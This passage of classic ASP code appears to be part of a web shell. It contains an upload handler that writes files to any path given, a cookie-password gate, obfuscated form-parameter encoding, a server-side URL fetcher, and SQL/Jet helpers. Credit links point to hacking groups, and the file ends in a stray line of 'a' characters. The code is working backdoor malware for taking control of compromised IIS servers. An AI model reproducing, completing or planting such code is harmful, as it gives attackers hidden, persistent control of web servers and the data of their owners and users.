				theFile.FileName=getFileName(sFileName)
				theFile.FilePath=getFilePath(sFileName)
				theFile.FileExt=GetFileExt(sFileName)
				IfindStart=InStr(IfindEnd,sInfo,"Content-Type: ",1)+14
				IfindEnd=InStr(IfindStart,sInfo,vbCr)
				theFile.FileType =Mid(sinfo,IfindStart,IfindEnd-IfindStart)
				theFile.FileStart =iInfoEnd
				theFile.FileSize=IformStart-iInfoEnd-3
				theFile.FormName=sFormName
				If not objFile.Exists(sFormName)Then
					objFile.add sFormName,theFile
				End If
			Else
				tStream.Type =1
				tStream.Mode =3
				tStream.Open
				objStream.Position=iInfoEnd 
				objStream.CopyTo tStream,IformStart-iInfoEnd-3
				tStream.Position=0
				tStream.Type=2
				tStream.CharSet ="gb2312"
							sFormValue=tStream.ReadText 
							tStream.Close
				If objForm.Exists(sFormName) Then
					objForm(sFormName)=objForm(sFormName)&","&sFormValue			
				Else
					objForm.Add sFormName,sFormValue
				End If
			End If
			IformStart=IformStart+iStart+1
			wEnd
			RequestData=""
			Set tStream =nothing
		End Sub
		Private Sub Class_Terminate
			If Not isDebugMode Then On Error Resume Next
			If Request.TotalBytes>0 Then
			objForm.RemoveAll
			objFile.RemoveAll
			Set objForm=nothing
			Set objFile=nothing
			objStream.Close
			Set objStream =nothing
		End If
		End Sub
		Private Function GetFilePath(FullPath)
			If Not isDebugMode Then On Error Resume Next
			If FullPath<>"" Then
			GetFilePath=left(FullPath,InStrRev(FullPath,"\"))
			Else
			GetFilePath=""
			End If
		End Function
		Private Function GetFileExt(FullPath)
			If FullPath<>"" Then
				GetFileExt=mid(FullPath,InStrRev(FullPath,".")+1)
			Else
				GetFileExt=""
			End If
		End Function	
		Private Function GetFileName(FullPath)
			If FullPath<>"" Then
				GetFileName=mid(FullPath,InStrRev(FullPath,"\")+1)
			Else
				GetFileName=""
			End If
		End Function
	End Class

	Class FileInfo
		Dim FormName,FileName,FilePath,FileSize,FileExt,FileType,FileStart
		Private Sub Class_Initialize 
			FileName=""
			FilePath=""
			FileSize=0
			FileStart= 0
			FormName=""
			FileType=""
			FileExt	= ""
		End Sub	
		Public Function SaveAs(FullPath)
			Dim dr,ErrorChar,i
			SaveAs=True
			If Trim(fullpath)="" or FileStart=0 or FileName="" or Right(fullpath,1)="/" Then exit Function
			Set dr=CreateObject("Adodb.Stream")
			dr.Mode=3
			dr.Type=1
			dr.Open
			objStream.position=FileStart
			objStream.copyto dr,FileSize
			dr.SaveToFile FullPath,2
			dr.Close
			Set dr=nothing 
			SaveAs=False
		End Function
		Public Function InFile()
			objStream.position=FileStart
			InFile=objStream.Read(FileSize)
		End Function
	End Class
	Sub streamUpload()
		If Not isDebugMode Then On Error Resume Next
		If thePath="" Then thePath=aspPath
		If InStr(thePath,":")<1 Then thePath=aspPath&"\"&thePath
		Set theFile=cls_upload.File("upfile")
		If destName="" Then destName=theFile.FileName
		theFile.SaveAs(thePath&"\"&destName)
		If Err Then
			chkerr(Err)
		Else
			errMsgAdd("Upload Sucess")
		End If
	End Sub

	Function xmlGet(strUrl,method)
		If Not isDebugMode Then On Error Resume Next
		Dim pams
		If method="POST" Then
			pams=Split(strUrl,"?")(1)
			strUrl=Split(strUrl,"?")(0)
		End If
		objXml.Open method,strUrl,False
		If method="POST" Then
			objXml.SetRequestHeader"Content-Type","application/x-www-form-urlencoded"
			objXml.send pams
		Else
			objXml.send
		End If
		If regTest(objXml.getAllResponseHeaders(),"charSet ?= ?[""']?[\w-]+")Then
			pagecharSet=Trim(regReplace(regExecute(objXml.getAllResponseHeaders(),"charSet ?= ?[""']?[\w-]+",False)(0),"charSet ?= ?[""']?","",False))
		ElseIf regTest(objXml.ResponseText,"charSet ?= ?[""']?[\w-]+")Then
			pagecharSet=Trim(regReplace(regExecute(objXml.ResponseText,"charSet ?= ?[""']?[\w-]+",False)(0),"charSet ?= ?[""']?","",False))
		End If
		If pagecharSet=""Then pagecharSet=defaultChr
		xmlGet=bin2str2(objXml.responseBody,pagecharSet)
	End Function
	Function isIn()
		If Request.Cookies(cookiePass)=""Then
			isIn=False
			Exit Function
		End If
		If CFSEncode(Request.Cookies(cookiePass))=pass Then
			isIn=True
		Else
			isIn=False
		End If
	End Function
	Function secretEncode(pamToEn)
		If Not needEncode Or pamToEn=""Then
			secretEncode=pamToEn
			Exit Function
		End If
		Dim tt,tmpchr
		tt=""
		For i=1 To Len(pamToEn)
			tmpchr=Mid(pamToEn,i,1)
			If Asc(tmpchr)<128 And Asc(tmpchr)>0 Then
				tt=tt&Asc(tmpchr)+encodeNum&encodeCut
			Else
				tt=tt&tmpchr&encodeCut
			End If
		Next
		secretEncode=Left(tt,Len(tt)-1)
	End Function
	Function secretDecode(pamToDecode)
		If Not needEncode Or pamToDecode="" Or Not regTest(pamToDecode,"^((\d+|.)"&encodeCut&")+(\d+|.)$")Then
			secretDecode=pamToDecode
			Exit Function
		End If
		Dim dd,tmpArr
		dd=""
		tmpArr=Split(pamToDecode,encodeCut)
		For i=0 To UBound(tmpArr)
			If IsNumeric(tmpArr(i))Then
				dd=dd&Chr(CInt(tmpArr(i))-encodeNum)
			Else
				dd=dd&tmpArr(i)
			End If
		Next
		secretDecode=dd
	End Function
	Function getADS()
		Dim ADSstr,gwidth,gheight
		gwidth=88
		gheight=31
		ADSstr="<br>"
		ADSstr=ADSstr&"<a href='http://www.vtwo.cn/' target='_blank'>Bink Team</a> | "
		ADSstr=ADSstr&"<a href='http://0kee.com/' target='_blank'>0kee Team</a> | "
		ADSstr=ADSstr&"<a href='http://www.t00ls.net/' target='_blank'>T00ls</a> | "
		ADSstr=ADSstr&"<a href='http://www.helpsoff.com.cn' target='_blank'>Fuck Tencent</a>"
		getADS=ADSstr
	End Function
	Function bin2str2(binstr,strcharSet)
		If Not isDebugMode Then On Error Resume Next
		Dim BytesStream,StringReturn
		Set BytesStream=CreateObj("Adodb.Stream")
		With BytesStream
			.Type=2
			.Open
			.WriteText binstr
			.Position=0
			.CharSet=strcharSet
			.Position=2
			StringReturn=.ReadText(.Size)
			.close
		End With
		Set BytesStream=Nothing
		bin2str2=StringReturn
	End Function
	Function getServerVariable(str)
		getServerVariable=Request.ServerVariables(str)
	End Function
	Function CreateObj(strObj)
		Set CreateObj=Server.CreateObject(strObj)
	End Function
	Function getObj(strObj)
		Set getObj=GetObject(strObj)
	End Function
	Function UrlEnc(str)
		UrlEnc=server.urlencode(str)
	End Function
	Function getHex(str)
		Dim tmphex,tmpstr
		tmphex=""
		For i=0 To Len(str)-1
			tmpstr=Right(str,Len(str)-i)
			If Asc(tmpstr)<16 Then tmphex=tmphex&"0"
			tmphex=tmphex&CStr(Hex(Asc(tmpstr)))
		Next
	getHex="0x"&tmphex
	End Function
	Function getUtf(str)
		Dim tmphex,tmpstr
		tmphex=""
		For i=0 To Len(str)-1
			tmpstr=Right(str,Len(str)-i)
			tmphex=tmphex&CStr(Hex(Asc(tmpstr)))&"00"
		Next
	getUtf="0x"&tmphex
	End Function
	Function htmlEnc(str)
		str=textEncode(str)
		str=Replace(str,Chr(13)&Chr(10),"<br>")
		htmlEnc=Replace(str," ","&nbsp;")
	End Function
	Function textEncode(str)
		If Not isDebugMode Then On Error Resume Next
		str=CStr(str)
		If IsNull(str)Or str=""Then
			textEncode=""
			Exit Function
		End If
		textEncode=Server.HtmlEncode(str)
	End Function
	Function mapath(str)
		mapath=Server.MapPath(str)
	End Function
	Sub chkerr(Err)
		If Err Then
			errMsgAdd"Exception :"&Err.Description
			errMsgAdd"Exception source :"&Err.Source
			Err.Clear
		End If
	End Sub
	Function CfsEnCode(ByVal CodeStr) 
		Dim CodeLen 
		Dim CodeSpace 
		Dim NewCode 
		CodeLen=30 
		CodeSpace=CodeLen-Len(CodeStr) 
		If Not CodeSpace<1 Then 
			For cecr=1 To CodeSpace 
				CodeStr=CodeStr&Chr(21) 
			Next 
		End If 
		NewCode=1 
		Dim Ben 
		For cecb=1 To CodeLen 
			Ben=CodeLen+Asc(Mid(CodeStr,cecb,1)) * cecb 
			NewCode=NewCode * Ben 
		Next 
		CodeStr=NewCode 
		NewCode=Empty 
		For cec=1 To Len(CodeStr) 
			NewCode=NewCode&CfsCode(Mid(CodeStr,cec,3)) 
		Next 
		For cec=20 To Len(NewCode)-18 Step 2 
			CfsEnCode=CfsEnCode&Mid(NewCode,cec,1) 
		Next 
	End Function 

	Function CfsCode(word) 
		For cc=1 To Len(word) 
			CfsCode=CfsCode&Asc(Mid(word,cc,1)) 
		Next 
		CfsCode=Hex(CfsCode) 
	End Function 
	Function getTheSize(theSize)
		If theSize>=(1024 * 1024 * 1024)Then getTheSize=Fix((theSize /(1024 * 1024 * 1024))* 100)/ 100&"G"
		If theSize>=(1024 * 1024)And theSize<(1024 * 1024 * 1024)Then getTheSize=Fix((theSize /(1024 * 1024))* 100)/ 100&"M"
		If theSize>=1024 And theSize<(1024 * 1024)Then getTheSize=Fix((theSize / 1024)* 100)/ 100&"K"
		If theSize>=0 And theSize<1024 Then getTheSize=theSize&"B"
	End Function
	Function getDriveType(num)
		Select Case num
			Case 0
				getDriveType="Unknown"
			Case 1
				getDriveType="Removable"
			Case 2
				getDriveType="Local drive"
			Case 3
				getDriveType="Net drive"
			Case 4
				getDriveType="CD-ROM"
			Case 5
				getDriveType="RAM disk"
		End Select
	End Function
	Function doPathFormat(ByVal str)
		str=Replace(str,"\","\\")
		doPathFormat=Replace(str,"\\\\","\\")
	End Function
	Function getJetStr(str)
		getJetStr="Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&str
	End Function
	Function getLeft(str,sign,fromLeft)
		If str="" Or InStr(str,sign)<1 Then
			getLeft=""
			Exit Function
		End If
		If fromLeft Then
			getLeft=Left(str,InStr(str,sign)-1)
		Else
			getLeft=Left(str,InstrRev(str,sign)-1)
		End If
	End Function
	Function getRight(str,sign)
		If str="" Or InStr(str,sign)<1 Then
			getRight=""
			Exit Function
		End If
		getRight=Mid(str,InstrRev(str,sign)+Len(sign))
	End Function
	Sub echo(str)
		Response.Write str
	End Sub
	Sub echoLine(str)
		echo str&vbCrLf
	End Sub
	Sub doShowHideMe(strObj,hideMe)
		echo"<a href='#' onClick=""javascript:showHideMe("&strObj&")"" id='"&strObj&"href' class='hidehref'>"&strObj&" :</a>"
		echo"<span id="&strObj
		If hideMe Then echo" style='display:none;'"
		echoLine">"
	End Sub
	Sub doSubHref(goact,subact,pamms,showStr,plus)
		echoLine"<a href=""javascript:dosubmit('"&goact&"','"&subact&"','"&pamms&"')"">"&showStr&"</a>"&plus
	End Sub
	Sub doSqlHref(subAct,connStr,queryStr,tbname,intPage,showStr,plus)
		echoLine"<a href=""javascript:dosqlsubmit('"&subAct&"','"&connStr&"','"&queryStr&"','"&tbname&"','"&intPage&"')"">"&showStr&"</a>"&plus
	End Sub
	Sub doFont(str,color,size)
		echo"<font color="""&color&""""
		If size<>""Then echo" size="""&size&""""
		echoLine">"&str&"</font>"
	End Sub
	Sub doTable(width)
		echoLine"<table width="""&width&"""border=""0""cellpadding=""0""cellspacing=""0"">"
	End Sub
	Sub doTtable()
		echoLine"</table>"
	End Sub
	Sub doTr(num)
		echo"<tr class='alt"&num&"' onmouseover=""javascript:this.className='focusTr';"" onmouseout=""javascript:this.className='alt"&num&"';"">"
	End Sub
	Sub doTh()
		echo"<tr class='link'>"
	End Sub
	Sub doSpan(num)
		echo"<span class='alt"&num&"Span'>"
	End Sub
	Sub doHideSpan(strObj,hideMe)
		echo"<span id="&strObj
		If hideMe Then echo" style='display:none;'"
		echoLine">"
	End Sub
	Sub doForm(needEn)
		echo"<form method=""post"" id=""form"&formId&""" action="""&pagePath&""""
		If needEn Then echo" onSubmit=""javascript:doEncode('form"&formId&"')"""
		echoLine">"
		doHidden"goaction",goaction
		formId=formId+1
	End Sub
	Sub doFform()
		echoLine"</form>"
	End Sub
	Sub doTdSubmit(value,width)
		echo"<td style=""width:"&width&""">"
		echo"<input type=""submit"" value="""&value&""" class=""bt"">"
		echoLine"</td>"
	End Sub
	Sub doTdFont(str,color,size)
		echo"<td>"
		doFont str,color,size
		echoLine"</td>"
	End Sub
	Sub doTtr()
		echoLine"</tr>"
	End Sub
	Sub doTd(td,width)
		If td=""Or IsNull(td)Then td="<font color=""red"">Null</font>"
		echo"<td"
		If width<>""Then echo" width='"&width&"'"
		echo">"
		echo CStr(td)
		echoLine"</td>"
	End Sub
	Sub doInput(typpe,name,value,size,plus)
		Dim cls
		If typpe="button"Or typpe="submit"Or typpe="reSet"Then
			cls="bt"
		Else
			cls="input"
		End If
		echo"<input type="""&typpe&""" name="""&name&""" id="""&name&""" value="""&textEncode(value)&""" size="""&size&""" class="""&cls&""" "&plus&"/>"
	End Sub
	Sub doChkBox(name,value,showname,plus)
		doInput"checkbox",name,value,"",plus
		echo"<label class=""lbl"" for="""&name&""">"&showname&"</label>"
	End Sub
	Sub doHidden(name,value)
		echoLine"<input type=""hidden"" name="""&name&""" id="""&name&""" value="""&value&""">"
	End Sub
	Sub doTdInput(typpe,name,value,width,plus,span)
		Dim cls
		If typpe="button"Or typpe="submit"Or typpe="reSet"Then
			cls="bt"
		Else
			cls="tdInput"
		End If
		If span=""Then span=1
		echo"<td colspan="&span&" style=""width:"&width&""">"
		echo"<input type="""&typpe&""" name="""&name&""" id="""&name&""" value="""&textEncode(value)&""" class="""&cls&""" "&plus&">"
		echoLine"</td>"
	End Sub
	Sub doSubmit(value)
		echoLine"<input type=""submit"" value="""&value&""" class=""bt"">"
	End Sub
	Sub doTdText(name,value,rows)
		echo"<td>"
		doTextarea name,value,"100%",rows," class=""tdText"""
		echoLine"</td>"
	End Sub
	Sub doTdNoWrap(str)
		If Not isDebugMode Then On Error Resume Next
		If IsObject(str)Or IsNull(str)Or str="" Then str="<font color=red>Null<font>"
		echo"<td nowrap>"&str&"</td>"
	End Sub
	Sub doTextarea(name,value,width,rows,plus)
		echo"<textarea name="""&name&""" id="""&name&""" style=""width:"&width&";"" rows="""&rows&""" class=""text"" "&plus&">"
		echo textEncode(value)
		echoLine"</textarea>"
	End Sub
	Sub doUl()
		echo"<ul class=""info"">"
	End Sub
	Sub doSelect(name,width,plus)
		echoLine"<select style=""width:"&width&""" name="""&name&""" "&plus&">"
	End Sub
	Sub doSselect()
		echoLine"</select>"
	End Sub
	Sub doOption(value,str)
		echoLine"<option value="""&value&""">"&str&"</option>"
	End Sub
	Sub trIdAdd()
		trId=trId+1
		If trId>=2 Then trId=0
	End Sub
	Sub doLabel(str)
		echoLine"<label>"&str&"</label>"
	End Sub
	Sub errMsgAdd(str)
		errMsg=errMsg&"<li>"&str&"</li>"
	End Sub
	Sub dieErr(Err)
		If Err Then
			chkerr(Err)
			doFin
		End If
	End Sub
	Function regTest(str,strPattern)
		objRe.Pattern=strPattern
		regTest=objRe.Test(str)
	End Function
	Function regExecute(str,strPattern,needFormat)
		If needFormat Then strPattern=regFormat(strPattern)
		objRe.Pattern=strPattern
		Set regExecute=objRe.Execute(str)
	End Function
	Function regReplace(str,strPattern,replaced,needFormat)
		If needFormat Then strPattern=regFormat(strPattern)
		objRe.Pattern=strPattern
		regReplace=objRe.Replace(str,replaced)
	End Function
	Function regFormat(str)
		str=Replace(str,"\","\\")
		str=Replace(str,".","\.")
		str=Replace(str,"?","\?")
		str=Replace(str,"+","\+")
		str=Replace(str,"(","\(")
		str=Replace(str,")","\)")
		str=Replace(str,"*","\*")
		str=Replace(str,"[","\[")
		str=Replace(str,"]","\]")
		regFormat=str
	End Function
%>
aaaaaaaaaaaa